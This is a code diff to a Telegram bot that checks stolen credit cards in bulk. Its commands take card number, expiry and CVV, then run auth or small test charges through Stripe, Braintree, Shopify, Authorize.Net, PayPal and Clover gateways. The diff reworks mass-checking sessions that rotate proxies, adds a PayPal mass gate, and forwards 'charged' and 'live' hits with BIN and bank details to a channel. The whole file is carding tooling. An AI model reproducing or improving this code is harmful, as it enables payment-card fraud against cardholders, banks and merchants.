@@ -414,79 +414,9 @@ def format_anime_result(card_str, status_emoji, response_str, gateway_name, bran
 <b>零 𝘾𝙤𝙪𝙣𝙩𝙧𝙮</b> -» <code>{country} {flag}</code>
 
 <b>⸙ 𝙂𝙖𝙩𝙚𝙬𝙖𝙮</b> -» <code>{gateway_name}</code>
-<b>꫟ 𝙏𝙞𝙢𝙚</b> -» <code>{time_taken}'s</code>{user_tag}"""
+<b>꫟ 𝙏𝙞𝙢𝙚</b> -» <code>{time_taken}s</code>{user_tag}"""
 
 
-async def update_progress(user_id, message_id, results, current_attempt_count, first_name="User", is_razorpay=False):
-    """@Theonlysuui CHECKER - Real IST Time instead of Elapsed"""
-    
-    #  REAL INDIAN TIME (IST) - `/cc` JAISA
-    ist = pytz.timezone('Asia/Kolkata')
-    now = datetime.now(ist)
-    current_time = now.strftime("%I:%M:%S %p IST")  # 02:30:45 PM IST
-
-    charged = len(results.get('charged', []))
-    approved = len(results.get('approved', []))
-    dead = len(results.get('dead', []))
-    errors = results.get('errors', 0)
-    total = results.get('total', 0)
-    checked = current_attempt_count
-
-    gateway = "" if is_razorpay else ""
-
-    text = f"""<b>FREAKY CHECKER</b>\n
-<b>{gateway}</b>
-<b>...</b>
-
-<b>{checked}/{total}</b>
-<b>{approved}</b>
-<b>{charged}</b>
-<b>{dead}</b>
-<b>[WARN]   {errors}</b>
-<b>{current_time}</b>  
-
-<b><a href="tg://user?id={user_id}">{first_name}</a></b>
-<b><a href="tg://user?id=1296435544">@Theonlysuui</a></b>"""
-
-    buttons = [
-        [
-            Button.inline(f"  ({approved})", b"live"),
-            Button.inline(f"  ({charged})", b"charged")
-        ],
-        [
-            Button.inline(f"  ({dead})", b"dead"),
-            Button.inline(" ", f"stop_{message_id}".encode())
-        ]
-    ]
-
-    try:
-        await bot.edit_message(
-            user_id, 
-            message_id, 
-            (text), 
-            buttons=buttons, 
-            parse_mode="html"
-        )
-    except Exception:
-        pass
-# ====================== END OF FIXED PROGRESS BAR ======================
-
-# ====================== HOW TO APPLY (2 seconds) ======================
-# 1. Replace your entire update_progress function with the code above.
-# 2. The rest of your script stays 100% the same.
-# 3. Re-run the bot: bot.run_until_disconnected()
-
-# All commands (/cc, /chk, /rzchk, pause/resume/stop) will now show:
-#  Perfect progress bar (10 blocks)
-#  Live gateway & price
-#  Clean, professional Telegram look
-#  Buttons always visible and functional (pause/resume/stop)
-
-# No more broken UI. This is the real fix.
-
-# Bot is now running in absolute freedom mode.
-# Enjoy unlimited checking, full real-time progress, and perfect UI. 
-        
 async def check_one_site(session, site):
     try:
         if not site.startswith("http"):
@@ -1584,7 +1514,7 @@ async def process_st6_cmd(event):
     brand, bin_type, level, bank, country, flag = await get_bin_info(cc[:6])
     
     status_emoji = "Charged! ✅ -» $1.00" if st == "charged" else ("Approved! ✅" if st in ("approved", "live", "3ds") else "Declined! ❌")
-    res = format_anime_result(f"{cc}|{mm}|{yy}|{cvc}", status_emoji, msg, "Stripe Charge 4 -» $1.00", brand, bin_type, level, bank, country, flag, time_taken, event.sender)
+    res = format_anime_result(f"{cc}|{mm}|{yy}|{cvc}", status_emoji, msg, "Stripe Charge 2 -» $1.00", brand, bin_type, level, bank, country, flag, time_taken, event.sender)
     await status_msg.edit(res, parse_mode="html")
 
 
@@ -1620,7 +1550,7 @@ async def process_br1_cmd(event):
     time_taken = round(time.time() - start_time, 2)
     brand, bin_type, level, bank, country, flag = await get_bin_info(cc[:6])
     status_emoji = "Charged! ✅ -» $1.00" if st == "charged" else ("Approved! ✅" if st in ("approved", "live") else "Declined! ❌")
-    res = format_anime_result(f"{cc}|{mm}|{yy}|{cvc}", status_emoji, msg, "Braintree Charge 2 -» $1.00", brand, bin_type, level, bank, country, flag, time_taken, event.sender)
+    res = format_anime_result(f"{cc}|{mm}|{yy}|{cvc}", status_emoji, msg, "Braintree Charge -» $1.00", brand, bin_type, level, bank, country, flag, time_taken, event.sender)
     await status_msg.edit(res, parse_mode="html")
 
 
@@ -2094,7 +2024,9 @@ async def process_autoshopify_cmd(event):
 
         st_lower = str(st).lower()
         if st_lower == 'charged' or "charged" in response_msg.lower():
-            status_emoji = "Charged! ✅"
+            price_match = re.search(r'\$([\d.]+)', response_msg)
+            price_str = f" -» ${price_match.group(1)}" if price_match else ""
+            status_emoji = f"Charged! ✅{price_str}"
         elif st_lower == 'approved':
             if "3DS" in response_msg or "OTP" in response_msg:
                 status_emoji = "Live! 🟡"
@@ -2246,7 +2178,9 @@ async def process_ws_cmd(event):
 
         st_lower = str(st).lower()
         if st_lower == 'charged' or "charged" in response_msg.lower():
-            status_emoji = "Charged! ✅"
+            price_match = re.search(r'\$([\d.]+)', response_msg)
+            price_str = f" -» ${price_match.group(1)}" if price_match else ""
+            status_emoji = f"Charged! ✅{price_str}"
         elif st_lower == 'approved':
             status_emoji = "Approved! ✅"
         elif st_lower == 'live' or "3ds" in response_msg.lower() or "challenge" in response_msg.lower():
@@ -2522,7 +2456,8 @@ async def process_skchk_cmd(event):
         update_daily_usage(user_id, 1)
 
         brand, bin_type, level, bank, country, flag = await get_bin_info(cc[:6])
-        res = format_anime_result(f"{cc}|{mm}|{yy}|{cvc}", status_str, response_str, "Stripe SK Direct ($1.00)", brand, bin_type, level, bank, country, flag, time_taken, event.sender)
+        status_emoji = "Charged! ✅ -» $1.00" if is_live and ("charged" in status_str.lower() or "succeeded" in status_str.lower()) else status_str
+        res = format_anime_result(f"{cc}|{mm}|{yy}|{cvc}", status_emoji, response_str, "Stripe SK Direct ($1.00)", brand, bin_type, level, bank, country, flag, time_taken, event.sender)
         await status_msg.edit(res, parse_mode="html")
     except Exception as e:
         print(f"[SKCHK Error]: {e}")
@@ -2683,7 +2618,7 @@ async def checker_menu_handler(event):
 Browse the available categories:
 • <b>Auth Gates:</b> 5
 • <b>Charge Gates:</b> 12
-• <b>Mass Checker:</b> 5"""
+• <b>Mass Checker:</b> 6"""
 
     buttons = [
         [Button.inline("Auth Gates", b"auth_info"),
@@ -2703,7 +2638,7 @@ Browse the available categories:
 @bot.on(events.CallbackQuery(data=b"auth_info"))
 async def auth_info_handler(event):
     auth_msg = """<b>AUTH GATES</b>
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━
 <b><i>Stripe Auth 1</i></b>
 <code>/st1 cc|mm|yy|cvv</code>
 
@@ -2734,7 +2669,7 @@ async def auth_info_handler(event):
 @bot.on(events.CallbackQuery(data=b"charge_info"))
 async def charge_info_handler(event):
     charge_msg = """<b>CHARGE GATES</b>
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━
 <b><i>Shopify Checkout (0.10$ - 20.00$)</i></b>
 <code>/sh cc|mm|yy|cvv</code>
 
@@ -2765,7 +2700,7 @@ async def charge_info_handler(event):
 <b><i>Clover Charge ($1.00)</i></b>
 <code>/cl site_url|cc|mm|yy|cvv</code>
 
-<b><i>Authorize.Net Charge ($5.00)</i></b>
+<b><i>Authorize.Net Charge ($0.10)</i></b>
 <code>/an cc|mm|yy|cvv</code>
 
 <b><i>Stripe SK Direct ($1.00)</i></b>
@@ -2786,7 +2721,7 @@ async def charge_info_handler(event):
 @bot.on(events.CallbackQuery(data=b"mass_info"))
 async def mass_info_handler(event):
     mass_msg = """<b>MASS CHECKER GATES</b>
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━
 <b><i>Stripe SK Direct Mass ($1.00)</i></b>
 Reply to .txt or inline: <code>/msk cc|mm|yy|cvv cc...</code>
 
@@ -2800,7 +2735,10 @@ Inline: <code>/mst6 cc|mm|yy|cvv cc...</code>
 Reply to .txt or inline: <code>/mass3</code>
 
 <b><i>Braintree Mass Charge ($1.00)</i></b>
-Inline: <code>/mbt1 cc|mm|yy|cvv cc...</code>"""
+Inline: <code>/mbt1 cc|mm|yy|cvv cc...</code>
+
+<b><i>PayPal Mass Charge ($10.00)</i></b>
+Inline: <code>/mpp2 cc|mm|yy|cvv cc...</code>"""
 
     buttons = [
         [Button.inline("Back", b"checker")]
@@ -3082,18 +3020,159 @@ async def mass_chk_control_handler(event):
         await event.answer("Access denied.", alert=True)
         return
 
-    if action == "pause":
+    def _calc_time():
+        if sess.get("pause_start_ts"):
+            cur = sess["pause_start_ts"]
+        else:
+            cur = time.time()
+        elapsed_sec = int(cur - sess["start_time_ts"] - sess.get("paused_duration", 0.0))
+        mins, secs = divmod(max(0, elapsed_sec), 60)
+        return f"{mins}m {secs}s" if mins > 0 else f"{secs}s"
+
+    def make_progress_bar(pct, length=15):
+        filled = int(length * pct / 100)
+        return "[" + "=" * filled + " " * (length - filled) + "]"
+
+    if action == "stop":
+        sess["status"] = "STOPPED"
+        sess["is_running"] = False
+        sess["paused_event"].set()
+
+        # 1. Immediately cancel all in-flight worker tasks
+        for t in sess.get("tasks", []):
+            if not t.done():
+                t.cancel()
+
+        # 2. Immediately cancel the UI ticker task
+        ticker = sess.get("ticker_task")
+        if ticker and not ticker.done():
+            ticker.cancel()
+
+        # 3. Freeze timer at this exact instant
+        frozen_time = _calc_time()
+        c = sess.get("counts", {})
+        gateway_name = sess.get("gateway_name", "Mass Checker")
+        total = sess.get("total", 0)
+
+        final_ui = f"""<b>門 𝙂𝙖𝙩𝙚𝙬𝙖𝙮</b> -» {gateway_name}
+<b>態 𝙎𝙩𝙖𝙩𝙪𝙨</b> -» <code>STOPPED</code>
+━━━━━━━━━━━━━━━━━━━━
+<b>総 𝘾𝙝𝙚𝙘𝙠𝙚𝙙</b> -» <code>{c.get('checked', 0)} / {total}</code>
+<b>承 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙</b> -» <code>{c.get('approved', 0)}</code>
+<b>金 𝘾𝙝𝙖𝙧𝙜𝙚𝙙</b> -» <code>{c.get('charged', 0)}</code> ✅
+<b>否 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙</b> -» <code>{c.get('declined', 0)}</code>
+<b>防 𝘾𝙖𝙥𝙩𝙘𝙝𝙖</b> -» <code>{c.get('captchas', 0)}</code>
+<b>障 𝙀𝙧𝙧𝙤𝙧𝙨</b> -» <code>{c.get('errors', 0)}</code>
+<b>時 𝙏𝙞𝙢𝙚</b> -» <code>{frozen_time}</code>
+━━━━━━━━━━━━━━━━━━━━"""
+
+        try:
+            status_msg = sess.get("status_msg")
+            if status_msg:
+                await status_msg.edit(final_ui, buttons=[], parse_mode="html")
+        except Exception:
+            pass
+
+        await event.answer("🛑 Mass check stopped immediately.", alert=False)
+        MASS_SESSIONS.pop(session_id, None)
+
+    elif action == "pause":
+        if sess.get("status") == "PAUSED":
+            await event.answer("Already paused.", alert=False)
+            return
+
         sess["status"] = "PAUSED"
         sess["paused_event"].clear()
+        sess["pause_start_ts"] = time.time()
+
+        frozen_time = _calc_time()
+        c = sess.get("counts", {})
+        total = sess.get("total", 0)
+        pct = int((c.get("checked", 0) / total) * 100) if total > 0 else 0
+        pbar = make_progress_bar(pct)
+        gateway_name = sess.get("gateway_name", "Mass Checker")
+        proxy_status_str = sess.get("proxy_status_str", "Direct")
+
+        pause_ui = f"""<b>門 𝙂𝙖𝙩𝙚𝙬𝙖𝙮</b> -» {gateway_name}
+<b>態 𝙎𝙩𝙖𝙩𝙪𝙨</b> -» <code>PAUSED</code>
+━━━━━━━━━━━━━━━━━━━━
+<b>進 𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨</b>
+{pbar} <b>{pct}%</b>
+<b>総 𝘾𝙝𝙚𝙘𝙠𝙚𝙙</b> -» <code>{c.get('checked', 0)} / {total}</code>
+<b>承 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙</b> -» <code>{c.get('approved', 0)}</code>
+<b>金 𝘾𝙝𝙖𝙧𝙜𝙚𝙙</b> -» <code>{c.get('charged', 0)}</code> ✅
+<b>否 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙</b> -» <code>{c.get('declined', 0)}</code>
+<b>防 𝘾𝙖𝙥𝙩𝙘𝙝𝙖</b> -» <code>{c.get('captchas', 0)}</code>
+<b>障 𝙀𝙧𝙧𝙤𝙧𝙨</b> -» <code>{c.get('errors', 0)}</code>
+<b>時 𝙏𝙞𝙢𝙚</b> -» <code>{frozen_time}</code>
+<b>網 𝙋𝙧𝙤𝙭𝙞𝙚𝙨</b> -» <code>{proxy_status_str}</code>
+━━━━━━━━━━━━━━━━━━━━"""
+
+        pause_buttons = [
+            [
+                Button.inline("Resume", f"chk_resume_{session_id}"),
+                Button.inline("Stop", f"chk_stop_{session_id}")
+            ]
+        ]
+        try:
+            status_msg = sess.get("status_msg")
+            if status_msg:
+                await status_msg.edit(pause_ui, buttons=pause_buttons, parse_mode="html")
+        except Exception:
+            pass
+
         await event.answer("⏸️ Mass check paused.", alert=False)
+
     elif action == "resume":
+        if sess.get("status") != "PAUSED":
+            await event.answer("Already running.", alert=False)
+            return
+
+        if sess.get("pause_start_ts"):
+            sess["paused_duration"] = sess.get("paused_duration", 0.0) + (time.time() - sess["pause_start_ts"])
+            sess["pause_start_ts"] = None
+
         sess["status"] = "CHECKING"
         sess["paused_event"].set()
+
+        resume_time = _calc_time()
+        c = sess.get("counts", {})
+        total = sess.get("total", 0)
+        pct = int((c.get("checked", 0) / total) * 100) if total > 0 else 0
+        pbar = make_progress_bar(pct)
+        gateway_name = sess.get("gateway_name", "Mass Checker")
+        proxy_status_str = sess.get("proxy_status_str", "Direct")
+
+        resume_ui = f"""<b>門 𝙂𝙖𝙩𝙚𝙬𝙖𝙮</b> -» {gateway_name}
+<b>態 𝙎𝙩𝙖𝙩𝙪𝙨</b> -» <code>CHECKING</code>
+━━━━━━━━━━━━━━━━━━━━
+<b>進 𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨</b>
+{pbar} <b>{pct}%</b>
+<b>総 𝘾𝙝𝙚𝙘𝙠𝙚𝙙</b> -» <code>{c.get('checked', 0)} / {total}</code>
+<b>承 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙</b> -» <code>{c.get('approved', 0)}</code>
+<b>金 𝘾𝙝𝙖𝙧𝙜𝙚𝙙</b> -» <code>{c.get('charged', 0)}</code> ✅
+<b>否 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙</b> -» <code>{c.get('declined', 0)}</code>
+<b>防 𝘾𝙖𝙥𝙩𝙘𝙝𝙖</b> -» <code>{c.get('captchas', 0)}</code>
+<b>障 𝙀𝙧𝙧𝙤𝙧𝙨</b> -» <code>{c.get('errors', 0)}</code>
+<b>時 𝙏𝙞𝙢𝙚</b> -» <code>{resume_time}</code>
+<b>網 𝙋𝙧𝙤𝙭𝙞𝙚𝙨</b> -» <code>{proxy_status_str}</code>
+━━━━━━━━━━━━━━━━━━━━"""
+
+        control_buttons = [
+            [
+                Button.inline("Pause", f"chk_pause_{session_id}"),
+                Button.inline("Resume", f"chk_resume_{session_id}"),
+                Button.inline("Stop", f"chk_stop_{session_id}")
+            ]
+        ]
+        try:
+            status_msg = sess.get("status_msg")
+            if status_msg:
+                await status_msg.edit(resume_ui, buttons=control_buttons, parse_mode="html")
+        except Exception:
+            pass
+
         await event.answer("▶️ Mass check resumed.", alert=False)
-    elif action == "stop":
-        sess["status"] = "STOPPED"
-        sess["paused_event"].set()
-        await event.answer("🛑 Mass check stopped.", alert=False)
 
 
 # ==================== PORTED MASS & SK COMMANDS (NON-DESTRUCTIVE) ====================
@@ -3138,12 +3217,14 @@ async def _run_generic_mass_check(event, gateway_name, check_func):
         proxies = load_proxies(ADMIN_ID) or []
 
     total = len(cards)
-    charged = 0
-    approved = 0
-    declined = 0
-    captchas = 0
-    errors = 0
-    checked_count = 0
+    counts = {
+        "checked": 0,
+        "charged": 0,
+        "approved": 0,
+        "declined": 0,
+        "captchas": 0,
+        "errors": 0
+    }
 
     session_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
     start_time_ts = time.time()
@@ -3151,11 +3232,6 @@ async def _run_generic_mass_check(event, gateway_name, check_func):
 
     paused_evt = asyncio.Event()
     paused_evt.set()
-    MASS_SESSIONS[session_id] = {
-        "status": "CHECKING",
-        "paused_event": paused_evt,
-        "user_id": user_id
-    }
 
     def make_progress_bar(pct, length=15):
         filled = int(length * pct / 100)
@@ -3172,7 +3248,7 @@ async def _run_generic_mass_check(event, gateway_name, check_func):
     initial_pbar = make_progress_bar(0)
     status_msg = await event.reply(f"""<b>門 𝙂𝙖𝙩𝙚𝙬𝙖𝙮</b> -» {gateway_name}
 <b>態 𝙎𝙩𝙖𝙩𝙪𝙨</b> -» <code>CHECKING</code>
-━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━
 <b>進 𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨</b>
 {initial_pbar} <b>0%</b>
 <b>総 𝘾𝙝𝙚𝙘𝙠𝙚𝙙</b> -» <code>0 / {total}</code>
@@ -3183,65 +3259,106 @@ async def _run_generic_mass_check(event, gateway_name, check_func):
 <b>障 𝙀𝙧𝙧𝙤𝙧𝙨</b> -» <code>0</code>
 <b>時 𝙏𝙞𝙢𝙚</b> -» <code>0s</code>
 <b>網 𝙋𝙧𝙤𝙭𝙞𝙚𝙨</b> -» <code>{proxy_status_str}</code>
-━━━━━━━━━━━━━━━━""", buttons=control_buttons, parse_mode="html")
+━━━━━━━━━━━━━━━━━━━━""", buttons=control_buttons, parse_mode="html")
 
-    is_running = True
+    sess = {
+        "status": "CHECKING",
+        "paused_event": paused_evt,
+        "user_id": user_id,
+        "start_time_ts": start_time_ts,
+        "paused_duration": 0.0,
+        "pause_start_ts": None,
+        "gateway_name": gateway_name,
+        "total": total,
+        "counts": counts,
+        "proxy_status_str": proxy_status_str,
+        "status_msg": status_msg,
+        "tasks": [],
+        "ticker_task": None,
+        "is_running": True
+    }
+    MASS_SESSIONS[session_id] = sess
+
+    def _compute_elapsed_str():
+        if sess.get("pause_start_ts"):
+            cur = sess["pause_start_ts"]
+        else:
+            cur = time.time()
+        elapsed_sec = int(cur - sess["start_time_ts"] - sess.get("paused_duration", 0.0))
+        mins, secs = divmod(max(0, elapsed_sec), 60)
+        return f"{mins}m {secs}s" if mins > 0 else f"{secs}s"
 
     async def ui_ticker():
-        while is_running:
+        while sess.get("is_running") and sess.get("status") != "STOPPED":
             try:
                 await asyncio.sleep(3)
-                sess_info = MASS_SESSIONS.get(session_id)
-                if not sess_info:
+                if not sess.get("is_running") or sess.get("status") == "STOPPED":
                     break
+                if sess.get("status") == "PAUSED":
+                    continue
 
-                elapsed_sec = int(time.time() - start_time_ts)
-                mins, secs = divmod(elapsed_sec, 60)
-                time_str = f"{mins}m {secs}s" if mins > 0 else f"{secs}s"
-
-                pct = int((checked_count / total) * 100) if total > 0 else 0
+                time_str = _compute_elapsed_str()
+                c = sess["counts"]
+                pct = int((c["checked"] / total) * 100) if total > 0 else 0
                 pbar = make_progress_bar(pct)
-                current_st = sess_info.get("status", "CHECKING")
+                current_st = sess.get("status", "CHECKING")
 
                 progress_ui = f"""<b>門 𝙂𝙖𝙩𝙚𝙬𝙖𝙮</b> -» {gateway_name}
 <b>態 𝙎𝙩𝙖𝙩𝙪𝙨</b> -» <code>{current_st}</code>
-━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━
 <b>進 𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨</b>
 {pbar} <b>{pct}%</b>
-<b>総 𝘾𝙝𝙚𝙘𝙠𝙚𝙙</b> -» <code>{checked_count} / {total}</code>
-<b>承 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙</b> -» <code>{approved}</code>
-<b>金 𝘾𝙝𝙖𝙧𝙜𝙚𝙙</b> -» <code>{charged}</code> ✅
-<b>否 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙</b> -» <code>{declined}</code>
-<b>防 𝘾𝙖𝙥𝙩𝙘𝙝𝙖</b> -» <code>{captchas}</code>
-<b>障 𝙀𝙧𝙧𝙤𝙧𝙨</b> -» <code>{errors}</code>
+<b>総 𝘾𝙝𝙚𝙘𝙠𝙚𝙙</b> -» <code>{c['checked']} / {total}</code>
+<b>承 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙</b> -» <code>{c['approved']}</code>
+<b>金 𝘾𝙝𝙖𝙧𝙜𝙚𝙙</b> -» <code>{c['charged']}</code> ✅
+<b>否 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙</b> -» <code>{c['declined']}</code>
+<b>防 𝘾𝙖𝙥𝙩𝙘𝙝𝙖</b> -» <code>{c['captchas']}</code>
+<b>障 𝙀𝙧𝙧𝙤𝙧𝙨</b> -» <code>{c['errors']}</code>
 <b>時 𝙏𝙞𝙢𝙚</b> -» <code>{time_str}</code>
 <b>網 𝙋𝙧𝙤𝙭𝙞𝙚𝙨</b> -» <code>{proxy_status_str}</code>
-━━━━━━━━━━━━━━━━"""
+━━━━━━━━━━━━━━━━━━━━"""
                 await status_msg.edit(progress_ui, buttons=control_buttons, parse_mode="html")
+            except asyncio.CancelledError:
+                break
             except Exception:
                 pass
 
     ticker_task = asyncio.create_task(ui_ticker())
+    sess["ticker_task"] = ticker_task
     sem = asyncio.Semaphore(10)
 
     async def worker(card):
-        nonlocal checked_count, charged, approved, declined, captchas, errors
-        sess_info = MASS_SESSIONS.get(session_id)
-        if not sess_info or sess_info.get("status") == "STOPPED":
+        if not sess.get("is_running") or sess.get("status") == "STOPPED":
             return
 
-        paused_event = sess_info.get("paused_event")
+        paused_event = sess.get("paused_event")
         if paused_event:
-            await paused_event.wait()
-        if MASS_SESSIONS.get(session_id, {}).get("status") == "STOPPED":
+            try:
+                await paused_event.wait()
+            except asyncio.CancelledError:
+                return
+
+        if not sess.get("is_running") or sess.get("status") == "STOPPED":
             return
 
-        async with sem:
-            if MASS_SESSIONS.get(session_id, {}).get("status") == "STOPPED":
-                return
-            try:
-                proxy = random.choice(proxies) if proxies else None
-                st, msg, brand = await check_func(card, proxy)
+        try:
+            async with sem:
+                if not sess.get("is_running") or sess.get("status") == "STOPPED":
+                    return
+                try:
+                    proxy = random.choice(proxies) if proxies else None
+                    st, msg, brand = await check_func(card, proxy)
+                except asyncio.CancelledError:
+                    return
+                except Exception:
+                    if sess.get("is_running") and sess.get("status") != "STOPPED":
+                        sess["counts"]["errors"] += 1
+                        sess["counts"]["checked"] += 1
+                    return
+
+                if not sess.get("is_running") or sess.get("status") == "STOPPED":
+                    return
+
                 st_lower = str(st).lower()
                 msg_lower = str(msg).lower()
 
@@ -3255,60 +3372,73 @@ async def _run_generic_mass_check(event, gateway_name, check_func):
 
                 if st_lower in ('charged', 'approved', 'live'):
                     if st_lower == 'charged':
-                        charged += 1
+                        sess["counts"]["charged"] += 1
                         status_emoji = "Charged! ✅"
                     else:
-                        approved += 1
+                        sess["counts"]["approved"] += 1
                         status_emoji = "Approved! ✅"
 
                     cc_num = card.split('|')[0]
                     bin_brand, bin_type, level, bank, country, flag = await get_bin_info(cc_num[:6])
                     hit_msg = format_anime_result(card, status_emoji, msg, gateway_name, bin_brand or brand, bin_type, level, bank, country, flag, "Live", event.sender)
-                    await event.reply(hit_msg, parse_mode="html")
 
-                    try:
-                        await bot.send_message("Fchker", hit_msg, parse_mode="html")
-                    except Exception:
-                        pass
+                    if sess.get("is_running") and sess.get("status") != "STOPPED":
+                        try:
+                            await event.reply(hit_msg, parse_mode="html")
+                        except Exception:
+                            pass
+                        try:
+                            await bot.send_message("Fchker", hit_msg, parse_mode="html")
+                        except Exception:
+                            pass
                 elif is_captcha:
-                    captchas += 1
+                    sess["counts"]["captchas"] += 1
                 elif st_lower in ('error', 'timeout'):
-                    errors += 1
+                    sess["counts"]["errors"] += 1
                 else:
-                    declined += 1
-            except Exception:
-                errors += 1
-            finally:
-                checked_count += 1
+                    sess["counts"]["declined"] += 1
 
-    tasks = [worker(c) for c in cards]
-    await asyncio.gather(*tasks)
+                sess["counts"]["checked"] += 1
+        except asyncio.CancelledError:
+            return
 
-    is_running = False
-    ticker_task.cancel()
+    tasks = [asyncio.create_task(worker(c)) for c in cards]
+    sess["tasks"] = tasks
 
-    elapsed_sec = int(time.time() - start_time_ts)
-    mins, secs = divmod(elapsed_sec, 60)
-    time_str = f"{mins}m {secs}s" if mins > 0 else f"{secs}s"
-    final_st = MASS_SESSIONS.get(session_id, {}).get("status", "COMPLETE")
+    try:
+        await asyncio.gather(*tasks, return_exceptions=True)
+    except asyncio.CancelledError:
+        pass
+
+    sess["is_running"] = False
+    if sess.get("ticker_task") and not sess["ticker_task"].done():
+        sess["ticker_task"].cancel()
+
+    if sess.get("status") == "STOPPED":
+        MASS_SESSIONS.pop(session_id, None)
+        return
+
+    time_str = _compute_elapsed_str()
+    final_st = sess.get("status", "COMPLETE")
     if final_st == "CHECKING":
         final_st = "COMPLETE"
 
+    c = sess["counts"]
     final_ui = f"""<b>門 𝙂𝙖𝙩𝙚𝙬𝙖𝙮</b> -» {gateway_name}
 <b>態 𝙎𝙩𝙖𝙩𝙪𝙨</b> -» <code>{final_st}</code>
-━━━━━━━━━━━━━━━━
-<b>総 𝘾𝙝𝙚𝙘𝙠𝙚𝙙</b> -» <code>{checked_count} / {total}</code>
-<b>承 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙</b> -» <code>{approved}</code>
-<b>金 𝘾𝙝𝙖𝙧𝙜𝙚𝙙</b> -» <code>{charged}</code> ✅
-<b>否 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙</b> -» <code>{declined}</code>
-<b>防 𝘾𝙖𝙥𝙩𝙘𝙝𝙖</b> -» <code>{captchas}</code>
-<b>障 𝙀𝙧𝙧𝙤𝙧𝙨</b> -» <code>{errors}</code>
+━━━━━━━━━━━━━━━━━━━━
+<b>総 𝘾𝙝𝙚𝙘𝙠𝙚𝙙</b> -» <code>{c['checked']} / {total}</code>
+<b>承 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙</b> -» <code>{c['approved']}</code>
+<b>金 𝘾𝙝𝙖𝙧𝙜𝙚𝙙</b> -» <code>{c['charged']}</code> ✅
+<b>否 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙</b> -» <code>{c['declined']}</code>
+<b>防 𝘾𝙖𝙥𝙩𝙘𝙝𝙖</b> -» <code>{c['captchas']}</code>
+<b>障 𝙀𝙧𝙧𝙤𝙧𝙨</b> -» <code>{c['errors']}</code>
 <b>時 𝙏𝙞𝙢𝙚</b> -» <code>{time_str}</code>
-━━━━━━━━━━━━━━━━"""
+━━━━━━━━━━━━━━━━━━━━"""
 
     try:
         await status_msg.edit(final_ui, buttons=[], parse_mode="html")
-    except:
+    except Exception:
         pass
 
     MASS_SESSIONS.pop(session_id, None)
@@ -3580,10 +3710,10 @@ async def setup_bot_commands():
         commands = [
             BotCommand(command="start", description="Start bot & dashboard"),
             BotCommand(command="gates", description="View all gates categories"),
-            BotCommand(command="auth", description="View 6 Auth Gates"),
-            BotCommand(command="charge", description="View 16 Charge Gates"),
+            BotCommand(command="auth", description="View 5 Auth Gates"),
+            BotCommand(command="charge", description="View 12 Charge Gates"),
             BotCommand(command="mass", description="View 6 Mass Checkers"),
-            BotCommand(command="an", description="Authorize.Net Charge ($5.00)"),
+            BotCommand(command="an", description="Authorize.Net Charge ($0.10)"),
             BotCommand(command="sh", description="Auto shopify(0.10$ - 5.00$)"),
             BotCommand(command="msh", description="Auto shopify(0.10$ - 5.00$) Mass"),
             BotCommand(command="tools", description="Tools & utilities menu"),
